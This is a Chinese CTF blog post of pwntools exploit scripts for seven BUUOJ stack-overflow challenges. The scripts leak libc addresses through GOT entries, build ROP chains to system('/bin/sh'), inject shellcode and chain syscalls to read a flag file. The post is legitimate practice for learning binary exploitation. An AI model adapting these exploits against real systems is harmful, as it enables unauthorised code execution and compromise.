---
title: ROP
tags: [ctf-pwn,exp]
date: 2022-11-16 19:07:00
categories: [ctf-pwn]
excerpt: exp
---

### 题目1

<https://buuoj.cn/challenges#ciscn_2019_c_1>

**Exp**

```python
from pwn import *
from LibcSearcher import *
p = process('./ciscn_2019_c_1')
# p = remote('node4.buuoj.cn',29563) 
elf = ELF('./ciscn_2019_c_1')

ret=0x4006b9
rdi=0x400c83
main=elf.sym['main']
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

#第一次攻击绕过函数
p.sendlineafter(b'Input your choice!\n',b'1')
payload=b'\0'+b'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendlineafter(b'Input your Plaintext to be encrypted\n',payload)
 
 
 
p.recvline()	#接收字符串Ciphertext
p.recvline()    #加密后的密文
#这里注意需要接收2次
 
puts_addr=u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\0'))  #得到 puts 函数 的地址

print(hex(puts_addr))

libc=LibcSearcher('puts',puts_addr) #获取libc的版本
offset=puts_addr-libc.dump('puts') #计算偏移量
binsh=offset+libc.dump('str_bin_sh') #计算字符串"/bin/sh"的地址
system=offset+libc.dump('system') #计算函数system的地址
 
#第二次攻击getshell
 
p.sendlineafter(b'Input your choice!\n',b'1')     #   再一次执行 一遍流程
payload=b'\0'+b'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)
p.sendlineafter(b'Input your Plaintext to be encrypted\n',payload)
p.interactive()



# ubuntu18版本以上调用64位程序中的system函数的栈对齐问题
# https://www.cnblogs.com/ZIKH26/articles/15996874.html
```

### 题目2

https://buuoj.cn/challenges#bjdctf_2020_babyrop

非常基本的一道利用puts函数构造rop链泄露libc基址的题目

**Exp**

```python
from pwn import *
from LibcSearcher import *

p = remote("node4.buuoj.cn",25323)

elf = ELF('./bjdctf_2020_babyrop')

main = elf.sym['main']
poprdi_ret = 0x400733

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

s = p.recv()
print(s)

payload = b'a'*40 + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendline(payload)

s = p.recv()

puts_addr = u64(s[:6].ljust(8,b'\x00'))
print(hex(puts_addr))

libc =LibcSearcher('puts',puts_addr)
offset = puts_addr - libc.dump('puts')
binsh = offset + libc.dump('str_bin_sh')
system = offset + libc.dump('system')

payload = b'a' * 40 + p64(poprdi_ret) + p64(binsh) + p64(system)

p.sendline(payload)

p.interactive()
```

### 题目3

https://buuoj.cn/challenges#get_started_3dsctf_2016

一道十分简单的栈溢出，将main的返回地址移交给自带的get_flag函数

把这道题列出来的原因在于，程序没有开启标准输入输出，

如果单纯执行完get_flag不设置一个正确的返回地址，这个函数里的输出显示不出来

（详细原因目前也不是很清楚）



**Exp**

针对上述问题，选择exit函数作为get_flag的返回地址（不能放一个空着的p32(0)进去）

```python
from pwn import *
from LibcSearcher import *

#p = remote("node4.buuoj.cn",27230)
p = process('./get_started_3dsctf_2016')

elf = ELF('./get_started_3dsctf_2016')

get_flag = 0x80489A0
param1 = 0x308CD64F
param2 = 0x195719D1

sleep(0.1)
payload = b'a'*56 + p32(get_flag) +p32(0x0804E6A0) + p32(param1) + p32(param2)

p.sendline(payload)

p.interactive()

```

### 题目4

<https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop>

从给定libc获取获取基址

由于给了libc版本，此exp展示使用指定的libc文件获取偏移的方法

不用给的libc文件的见下一道题，harekaze2019的babyrop2

**Exp**

```python
from pwn import *

# p = process('./pwn')
p = remote('node4.buuoj.cn',28818)
e = ELF('./pwn')

#payload 1
payload1 = '\x00' + '\xff' * 7
p.sendline(payload1)
p.recvuntil("Correct\n")

#payload 2
payload2 = (231 + 4) * b'a' + p32(e.plt['write']) + p32(0x08048825) +p32(1) + p32(e.got['write']) + p32(4)

p.sendline(payload2)

# leak addr
write_got = u32(p.recv(4))
print(hex(write_got))

#payload 3
libc = ELF("./libc-2.23.so")
libc.address =  write_got - libc.sym['write']
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
p.sendline(payload1)
payload3 =  (231 + 4) * b'a' + p32(system) + p32(0xdeadbeef) + p32(binsh)
p.sendline(payload3)

p.interactive()
```

### 题目5

**题目**

<https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2>

和前面一个题目同样，是一个构造rop链的栈溢出，虽然题目也给了libc文件，但是不是必要的

**方法**

这道题目的差别或值得注意的地方在于

1. 不再是用puts函数（只需要一个参数），这道题目中可以用printf构造rop链

   printf有两个参数，除了rdi寄存器之外，还需要rsi寄存器来传递参数，但是这个程序里没有直接的`pop rsi, ret`的代码，只有一个`pop rsi, pop r15, ret`，因此需要再额外给r15在栈上留出一个空间。详见exp代码。

2. 用read函数进行libc基地址泄露，虽然理论上用printf也可以，但是我不知道为什么没有成功，我在网上查的时候别人也有这个问题

**Exp**

```python
from pwn import *
from LibcSearcher import *

#p = process('./babyrop2')
p = remote("node4.buuoj.cn",29507)

elf = ELF('./babyrop2')

poprdi_ret = 0x400733
poprsi_popr15_ret = 0x400731
main = elf.sym['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']

read_plt = elf.plt['read']
read_got = elf.got['read']

format_str = 0x400790

payload = b'a'*40 + p64(poprdi_ret) + p64(format_str) + \
          p64(poprsi_popr15_ret) + p64(read_got) + p64(0) + p64(printf_plt) + p64(main)

p.sendlineafter("What's your name? ",payload)

read_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print('read_addr:' + hex(read_addr))

libc = LibcSearcher('read', read_addr)
offset = read_addr - libc.dump('read')
binsh = offset + libc.dump('str_bin_sh')
system = offset + libc.dump('system')

payload = b'a'*40 + p64(poprdi_ret) + p64(binsh) + p64(system)

p.sendlineafter("What's your name? ", payload)
p.interactive()
```

### 题目6

<https://buuoj.cn/challenges#ciscn_2019_n_5>

![](/img/ciscn_2019_n_5/1.jpg)

依旧是栈溢出，可以构造rop，也可以直接ret2shellcode（没开NX）

由于rop写习惯了，先列出rop的做法

![](/img/ciscn_2019_n_5/2.jpg)

第一个输入随便写，第二个输入开始溢出

![](/img/ciscn_2019_n_5/3.jpg)

溢出30+2+8 = 40个字节，用puts的got表来泄露libc基址

值得注意的是返回main后第二遍溢出时需要栈对齐

**Exp1**

```python
from pwn import *
from LibcSearcher import *

#p = process("./ciscn_2019_n_5")
p = remote('node4.buuoj.cn',27829)

e = ELF("./ciscn_2019_n_5")

main = e.symbols["main"]
puts_got = e.got["puts"]
puts_plt = e.plt["puts"]

pop_rdi = 0x400713
ret = 0x4004c9

p.recvline()
p.sendline(b'aaaa')
p.recvline()

payload = b'a' * 40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendlineafter(b"What do you want to say to me?\n", payload)

puts_addr =  u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

print(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)
offset = puts_addr - libc.dump('puts')
system = offset + libc.dump('system')
binsh = offset + libc.dump('str_bin_sh')

p.recvline()
p.sendline(b'aaaa')
p.recvline()

payload = b'a' * 40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter(b"What do you want to say to me?\n", payload)
p.interactive()
```



**ret2shellcode**

![](/img/ciscn_2019_n_5/4.jpg)

由于题目给了bss段上100个字节的空间，可以用来写shellcode

需要在注意的包括context.arch设置平台环境

而且特意看了一下 `len(shellcode) `是 48 < 100字节

```python
from pwn import *
from LibcSearcher import *

#p = process("./ciscn_2019_n_5")
p = remote('node4.buuoj.cn',27829)

context.arch = 'amd64'
context.log_level = 'debug'
shellcode = asm(shellcraft.sh())
name_addr = 0x0601080
p.sendlineafter("tell me your name\n",shellcode)
payload = b'a' * (0x20 + 0x8) + p64(name_addr)
p.sendlineafter(b"What do you want to say to me?\n",payload)
p.interactive()
```

### 题目7

发现没有写过ret2syscall的题目，记录一下方便忘了再看

```python
payload = b'/flag\x00'+b'a'*(0x48-6) + p64(pop_rdi)+p64(buf)+p64(pop_rsi)+p64(0)\
    + p64(pop_rdx) + p64(0) \
    + p64(pop_rax)+p64(2)+p64(syscall) + p64(pop_rdi) + p64(3) +p64(pop_rsi) + p64(buf+0x10) \
    +p64(pop_rdx)+p64(0x32) +p64(pop_rax)+p64(0)+p64(syscall)+ p64(pop_rdi) + p64(1) + p64(pop_rsi) \
    + p64(buf+0x10) + p64(pop_rdx) + p64(0x90) + p64(pop_rax) + p64(1) +p64(syscall)
```

| %rax | System call | %rdi                 | %rsi            | %rdx         | %r10 | %r8  | %r9  |
| :--- | :---------- | :------------------- | :-------------- | :----------- | :--- | :--- | :--- |
| 0    | sys_read    | unsigned int fd      | char *buf       | size_t count |      |      |      |
| 1    | sys_write   | unsigned int fd      | const char *buf | size_t count |      |      |      |
| 2    | sys_open    | const char *filename | int flags       | int mode     |      |      |      |
| 3    | sys_close   | unsigned int fd      |                 |              |      |      |      |